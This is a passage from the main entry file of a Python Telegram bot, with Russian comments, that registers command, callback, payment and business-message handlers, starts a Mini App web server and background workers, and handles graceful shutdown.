    app.add_handler(CommandHandler(["emoji_status", "status"], lambda u, c: emoji_status_command(u, c, DB)))
    app.add_handler(CommandHandler("time", lambda u, c: handle_time_command(u, c, DB)))
    app.add_handler(CommandHandler("weather", lambda u, c: handle_weather_command(u, c, DB)))
    app.add_handler(CommandHandler("admin", lambda u, c: admin_command(u, c, DB)))
    app.add_handler(CommandHandler("add_admin", lambda u, c: add_admin_command(u, c, DB)))
    app.add_handler(CommandHandler("del_admin", lambda u, c: del_admin_command(u, c, DB)))
    app.add_handler(CommandHandler("give_feature", lambda u, c: give_feature_command(u, c, DB)))
    app.add_handler(CommandHandler("broadcast", lambda u, c: broadcast_command(u, c, DB)))
    app.add_handler(CommandHandler("ai", lambda u, c: handle_ai_command(u, c, DB)))

    # Команды через точку в личных сообщениях с ботом (исключая бизнес-сообщения)
    dm_filter = filters.ChatType.PRIVATE & filters.UpdateType.MESSAGE
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.(app|webapp)\b"), webapp_command))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.help\b"), help_command))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.streak\b"), lambda u, c: handle_series_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.time\b"), lambda u, c: handle_time_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.weather\b"), lambda u, c: handle_weather_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.description\b"), lambda u, c: description_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.(emoji_status|status)\b"), lambda u, c: emoji_status_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.avtostop\b"), avtostop_command))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.premium\b"), lambda u, c: premium_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.admin\b"), lambda u, c: admin_command(u, c, DB)))
    app.add_handler(MessageHandler(dm_filter & filters.Regex(r"^\.ai\b"), lambda u, c: handle_ai_command(u, c, DB)))

    # Интерактивный текст в ЛС с ботом
    app.add_handler(MessageHandler(dm_filter & filters.TEXT & ~filters.COMMAND, on_private_text_message))

    # Платежи Stars
    app.add_handler(PreCheckoutQueryHandler(pre_checkout_handler))
    app.add_handler(MessageHandler(filters.SUCCESSFUL_PAYMENT, lambda u, c: successful_payment_handler(u, c, DB)))

    # Инструкции и главные переходы меню
    async def _instruction_or_menu(u, c):
        q = u.callback_query
        if not q:
            return
        if q.data == "desc:open_start":
            await q.answer()
            await description_command(u, c, DB)
        elif q.data == "time:open_start":
            await q.answer()
            await send_timezone_menu(u, c, DB)
        elif q.data == "emj:open_start":
            await q.answer()
            await emoji_status_command(u, c, DB)
        else:
            await instruction_callback(u, c)

    app.add_handler(CallbackQueryHandler(_instruction_or_menu, pattern=r"^(instruction|start_back|desc:open_start|time:open_start|emj:open_start)$"))

    # Инлайн-кнопки по разделам
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_series_callback(u, c, DB), pattern=r"^strk:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_time_callback(u, c, DB), pattern=r"^tz:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_premium_callback(u, c, DB), pattern=r"^prem:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_description_callback(u, c, DB), pattern=r"^(desc:|pbio:)"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_emoji_status_callback(u, c, DB), pattern=r"^emj:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_admin_callback(u, c, DB), pattern=r"^adm:"))
    app.add_handler(CallbackQueryHandler(lambda u, c: handle_media_callback(u, c, DB), pattern=r"^mdl:"))

    # Бизнес-сообщения
    app.add_handler(MessageHandler(filters.UpdateType.BUSINESS_MESSAGE, on_business_message))
    app.add_handler(MessageHandler(filters.UpdateType.EDITED_BUSINESS_MESSAGE, on_edited_business_message))
    app.add_handler(BusinessMessagesDeletedHandler(on_deleted_messages))

    async def run():
        await app.initialize()
        await app.start()
        await app.updater.start_polling()

        if WEBAPP_URL:
            try:
                from telegram import MenuButtonWebApp, WebAppInfo
                await app.bot.set_chat_menu_button(
                    menu_button=MenuButtonWebApp(text="📱 Mini App", web_app=WebAppInfo(url=WEBAPP_URL))
                )
                logging.info("Кнопка меню Mini App установлена: %s", WEBAPP_URL)
            except Exception as e:
                logging.warning("Не удалось установить MenuButtonWebApp: %s", e)

        worker_task = asyncio.create_task(series_worker(app, DB))
        name_task = asyncio.create_task(name_worker(app, DB, interval_seconds=60))
        bio_task = asyncio.create_task(bio_worker(app, DB, interval_seconds=300))
        desc_task = asyncio.create_task(description_worker(app, DB, interval_seconds=60))
        emoji_task = asyncio.create_task(emoji_status_worker(app, DB, interval_seconds=30))
        webapp_task = asyncio.create_task(
            start_webapp_server(app, DB, BOT_TOKEN, OWNER_ID, host=WEBAPP_HOST, port=WEBAPP_PORT)
        )

        stop_event = asyncio.Event()

        def _stop(*_):
            stop_event.set()

        loop = asyncio.get_running_loop()
        try:
            loop.add_signal_handler(signal.SIGINT, _stop)
            loop.add_signal_handler(signal.SIGTERM, _stop)
        except NotImplementedError:
            signal.signal(signal.SIGINT, lambda *_: loop.call_soon_threadsafe(stop_event.set))

        logging.info("Бот запущен. Ждём события…")
        await stop_event.wait()

        worker_task.cancel()
        name_task.cancel()
        bio_task.cancel()
        desc_task.cancel()
        emoji_task.cancel()
        webapp_task.cancel()
        for t in (worker_task, name_task, bio_task, desc_task, emoji_task, webapp_task):
            try:
                await t
            except asyncio.CancelledError:
                pass

        logging.info("Останавливаюсь…")
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

    asyncio.run(run())


if __name__ == "__main__":
    main()